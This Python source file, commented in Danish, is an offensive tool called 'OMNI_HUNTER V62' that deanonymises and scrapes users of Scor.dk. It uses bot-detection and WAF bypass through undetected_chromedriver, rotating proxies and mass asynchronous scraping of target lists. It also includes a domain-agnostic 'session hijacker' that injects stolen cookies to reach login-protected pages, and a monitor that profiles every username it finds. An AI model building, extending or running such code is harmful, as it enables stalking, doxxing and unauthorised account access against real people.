#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🚀 OMNI_HUNTER V62: SCOR.DK STEALTH SCRAPER (GOLIATH EXPANSION)
📌 Formål: Fuldautomatisk deanonymisering og dataudtræk fra Scor.dk via API & Stealth Browser.

======================================================================
🔥 COMMAND CENTER CHEATSHEET
======================================================================
1. STANDARD KØRSEL (Enkelt mål):
   python3 run_scor.py --target "brugernavn123"

2. ASYNKRON MASSE-SCRAPING (Med proxy-rotation):
   python3 run_scor.py --batch-file targets.txt --workers 5 --proxies proxies.txt

3. CELERY WORKER MODE (Baggrunds-dæmon):
   Terminal 1: redis-server --daemonize yes
   Terminal 2: python3 goliath_worker.py (eller celery -A core.web_server worker --pool=prefork)
   Terminal 3: celery -A core.web_server flower (Overvågning på http://localhost:5555)
======================================================================

🔧 Features:
   - Undetected Chromedriver til WAF/Bot-bypass.
   - Direkte API-interception baseret på SITERIP intel.
   - FTS5 Data Lake Integration (Batch 22 kompatibel).
"""

import time
import json
import re
import asyncio
import requests
import urllib.parse
import itertools
from typing import Dict, Any, List, Optional

try:
    import undetected_chromedriver as uc
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
except ImportError:
    uc = None

from core.utils import logger, datalake, RateLimiter, C

class ScorHunter:
    def __init__(self, target_username: Optional[str] = None, headless: bool = True, proxy: Optional[str] = None):
        self.target = target_username
        self.base_url = "https://www.scor.dk"
        self.api_base = "https://www.scor.dk/api"
        self.session = requests.Session()
        self.headless = headless
        self.proxy = proxy
        # Tillad max 15 requests per 60 sekunder pr. instans for OPSEC
        self.rate_limiter = RateLimiter(calls=15, period=60)
        
        # Standard headers til at narre simple API-tjek
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://www.scor.dk/",
            "X-Requested-With": "XMLHttpRequest"
        })

    def _wait_for_rate_limit(self):
        """In-memory rate limiter sleep for at undgå IP blacklisting."""
        while not self.rate_limiter.is_allowed("scor_scraper"):
            logger.info("ScorHunter: Rate limit ramt. Venter for OPSEC...")
            time.sleep(5)

    async def fetch_public_api_data(self, endpoint: str) -> Dict[str, Any]:
        """Henter data direkte fra Scor.dk's åbne REST API (afsløret via SITERIPs)."""
        self._wait_for_rate_limit()
        target_url = f"{self.api_base}/{endpoint}"
        
        try:
            response = self.session.get(target_url, timeout=15)
            response.raise_for_status()
            
            # Strict UTF-8 sikring ved json parsing
            data = response.json()
            logger.info(f"ScorHunter: Hentede API data fra {endpoint} med succes.")
            return data
        except requests.exceptions.RequestException as e:
            logger.error(f"ScorHunter API Fejl ved {target_url}: {e}")
            return {}
        except json.JSONDecodeError:
            logger.warning(f"ScorHunter: Endpoint {target_url} returnerede ikke JSON.")
            return {}

    def _get_robust_driver(self, options=None) -> Any:
        """GOLIATH AUTO-HEAL: Fikser ChromeDriver version mismatch og forhindrer Options-genbrug."""
        if not options:
            options = uc.ChromeOptions()
            if self.headless:
                options.add_argument('--headless')
            options.add_argument('--disable-gpu')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-blink-features=AutomationControlled')
            if self.proxy:
                options.add_argument(f'--proxy-server={self.proxy}')
            
        try:
            return uc.Chrome(options=options)
        except Exception as e:
            error_msg = str(e)
            if "Current browser version is" in error_msg and "only supports Chrome version" in error_msg:
                match = re.search(r"Current browser version is (\d+)", error_msg)
                if match:
                    v_main = int(match.group(1))
                    logger.warning(f"OmniHeal: Chrome version mismatch. Patcher ChromeDriver til version_main={v_main}...")
                    
                    new_options = uc.ChromeOptions()
                    if self.headless:
                        new_options.add_argument('--headless')
                    new_options.add_argument('--disable-gpu')
                    new_options.add_argument('--no-sandbox')
                    new_options.add_argument('--disable-blink-features=AutomationControlled')
                    if self.proxy:
                        new_options.add_argument(f'--proxy-server={self.proxy}')

                    # Forsøger standard UC patch, falder tilbage til webdriver_manager iflg. CODE CHALLENGE
                    try:
                        return uc.Chrome(options=new_options, version_main=v_main)
                    except Exception as inner_e:
                        logger.warning(f"OmniHeal: Standard UC patch fejlede ({inner_e}). Omdirigerer via webdriver_manager...")
                        from webdriver_manager.chrome import ChromeDriverManager
                        driver_path = ChromeDriverManager().install()
                        return uc.Chrome(options=new_options, version_main=v_main, driver_executable_path=driver_path)
            raise e

    def stealth_extract_profile(self) -> bool:
        """Brug undetected_chromedriver til at trække data bag JS/Cloudflare mure."""
        if not uc:
            logger.critical("undetected_chromedriver mangler. Kør: pip install undetected-chromedriver")
            return False
            
        options = uc.ChromeOptions()
        if self.headless:
            options.add_argument('--headless')
        options.add_argument('--disable-gpu')
        options.add_argument('--no-sandbox')
        
        driver = self._get_robust_driver(options=options)
        try:
            target_url = f"{self.base_url}/profile/{self.target}" if self.target else self.base_url
            logger.info(f"ScorHunter: Starter stealth navigering mod {target_url}")
            driver.get(target_url)
            
            # Vent på at dom loader (anti-bot bypass)
            time.sleep(4) 
            
            # Her kan vi injicere javascript for at stjæle Redux/Vue state
            page_source = driver.page_source
            
            # Pak data til datalake.ingest format
            payload = {
                "source_url": target_url,
                "raw_html_snippet": page_source[:1500], # Gem kun toppen for at spare plads, vi er primært efter API'erne
                "Master_Personas": [{
                    "name": self.target,
                    "social_handle": f"scor.dk/{self.target}",
                    "raw_data_ref": target_url
                }]
            }
            
            # Indsæt alt i datalake - FTS5 indekset æder det råt!
            datalake.ingest(source_module="mod_scor_hunter", target=str(self.target), data=payload)
            logger.info(f"ScorHunter: Profil {self.target} injiceret i GOLIATH Data Lake.")
            return True
            
        except Exception as e:
            logger.error(f"ScorHunter Stealth Scrape fejlede: {e}")
            return False
        finally:
            if driver: driver.quit()

    def stealth_scrape_with_cookies(self, target_url: str, cookies_path: str) -> None:
        """
        GOLIATH EXPANSION: Universel Session Hijacker.
        Bruger stjålne cookies fra en JSON-fil til at tilgå sider bag login.
        Bygget til at være domæne-agnostisk.
        """
        if not uc:
            logger.critical("undetected_chromedriver mangler. Kan ikke udføre session hijack.")
            return

        try:
            with open(cookies_path, 'r') as f:
                cookies = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError) as e:
            logger.error(f"ScorHunter Cookie Fejl: Kunne ikke læse eller parse {cookies_path}. Fejl: {e}")
            return

        # Udled domænet for korrekt cookie-injektion
        parsed_uri = urllib.parse.urlparse(target_url)
        domain = parsed_uri.netloc
        base_scheme = parsed_uri.scheme
        base_url = f"{base_scheme}://{domain}"

        options = uc.ChromeOptions()
        if self.headless:
            options.add_argument('--headless')
        driver = self._get_robust_driver(options=options)

        try:
            # OPSEC: Gå til en simpel side på domænet FØRST for at sætte kontekst
            logger.info(f"ScorHunter Hijack: Navigerer til {base_url} for at sætte domænekontekst.")
            driver.get(base_url)
            time.sleep(2)

            # Injicer alle cookies
            for cookie in cookies:
                # Sørg for at cookie har det korrekte domæne
                if 'domain' not in cookie:
                    cookie['domain'] = domain
                driver.add_cookie(cookie)
            logger.info(f"ScorHunter Hijack: {len(cookies)} cookies injiceret for domænet {domain}.")

            # Tilgå nu den faktiske, beskyttede URL
            logger.info(f"ScorHunter Hijack: Forsøger at tilgå beskyttet URL: {target_url}")
            driver.get(target_url)
            time.sleep(5) # Vent på at siden reagerer på den nye session

            # Dump den fulde sidekilde til datalake
            payload = {"hijacked_url": target_url, "full_page_source": driver.page_source}
            datalake.ingest(source_module="mod_scor_hunter_hijack", target=domain, data=payload)
            logger.info(f"ScorHunter Hijack: Kompromitteret side fra {target_url} er blevet injiceret i Data Lake.")

        except Exception as e:
            logger.error(f"ScorHunter Session Hijack fejlede: {e}")
        finally:
            driver.quit()

    async def start_hvt_monitor(self, search_query: str, poll_interval: int = 60) -> None:
        """
        Asynkron overvågning af API'et. Trækker data via fritekstsøgning.
        GOLIATH EXPANSION: Hvis dataen rammer et søgeord i din Watchlist, sørger `datalake.ingest`
        helt automatisk for at skyde et IPC-signal til din WebSocket Dæmon (HVT_HIT).
        """
        logger.info(f"ScorHunter: Starter stealth monitorering for '{search_query}' (Interval: {poll_interval}s)")
        encoded_query = urllib.parse.quote(search_query)
        # Vi bruger et formodet API søge-endpoint baseret på intel. Kan udskiftes med nyeste SITERIP endpoints.
        endpoint = f"Search/Global?q={encoded_query}&take=50"
        
        import threading
        while True:
            try:
                data = await self.fetch_public_api_data(endpoint)
                if data:
                    # Ingest direkte i Data Lake. Utils.py håndterer automatisk WAF og HVT_HIT IPC pipe!
                    datalake.ingest(source_module="mod_scor_monitor", target=search_query, data=data)
                    
                    # GOLIATH EXPANSION: Hunter-Killer Auto-Scraping
                    # Vi leder efter brugernavne i det returnerede JSON-array og affyrer Stealth Extraction
                    if "items" in data and isinstance(data["items"], list):
                        for item in data["items"]:
                            profile_name = item.get("ProfileName") or item.get("profileName") or item.get("username")
                            if profile_name:
                                logger.info(f"ScorHunter Monitor: Nyt mål opsnappet '{profile_name}'. Starter Hunter-Killer tråd...")
                                # Kør i baggrundstråd for ikke at blokere den asynkrone monitor
                                scraper = ScorHunter(target_username=profile_name, headless=True)
                                threading.Thread(target=scraper.stealth_extract_profile, daemon=True).start()
                                
            except Exception as e:
                logger.error(f"ScorHunter Monitor Fejl: {e}")
                
            # Vent OPSEC-sikkert før næste poll
            await asyncio.sleep(poll_interval)

    async def _scrape_single_target(self, username: str, semaphore: asyncio.Semaphore, proxy: Optional[str] = None):
        """Kører den synkrone Selenium-scraper isoleret i en asynkron baggrundstråd uden at blokere."""
        async with semaphore:
            def sync_scrape():
                hunter = ScorHunter(target_username=username, headless=self.headless, proxy=proxy)
                try:
                    hunter.stealth_extract_profile()
                    return True
                except Exception as ex:
                    logger.error(f"Fejl ved scraping af {username}: {ex}")
                    return False
            
            # Sender den tunge/blokerende browser-opgave til en worker-thread
            await asyncio.to_thread(sync_scrape)

    async def stealth_extract_all_async(self, filepath: str, max_concurrent: int = 5, proxies_file: Optional[str] = None):
        """
        GOLIATH EXPANSION: Ægte asynkron mass-scraping engine.
        Læser 500+ mål fra .txt og scraper dem uden at blokere event-loopet.
        """
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            logger.error(f"Masse-angreb fejlede: Fil ikke fundet på stien {filepath}")
            return

        # Proxy Rotation Setup
        proxies = []
        if proxies_file:
            try:
                with open(proxies_file, 'r', encoding='utf-8') as pf:
                    proxies = [line.strip() for line in pf if line.strip()]
                logger.info(f"🛡️ GOLIATH SHIELD: Indlæste {len(proxies)} proxies til Round-Robin rotation.")
            except FileNotFoundError:
                logger.warning(f"⚠️ Proxyfil '{proxies_file}' ikke fundet. Fortsætter uden IP-rotation!")
                
        proxy_pool = itertools.cycle(proxies) if proxies else None
        logger.info(f"🚀 Påbegynder ASYNKRON masse-angreb på {len(targets)} mål fra {filepath} (Workers: {max_concurrent}).")
        
        # Opretter en semaphore for at forhindre RAM-nedsmeltning ved hundredvis af samtidige browsere
        semaphore = asyncio.Semaphore(max_concurrent)
        tasks = [self._scrape_single_target(user, semaphore, proxy=next(proxy_pool) if proxy_pool else None) for user in targets]
        
        # Udfør alt arbejde i parallel, non-blocking
        await asyncio.gather(*tasks)
        logger.info(f"🏁 Masse-angreb fra filen {filepath} er fuldført!")
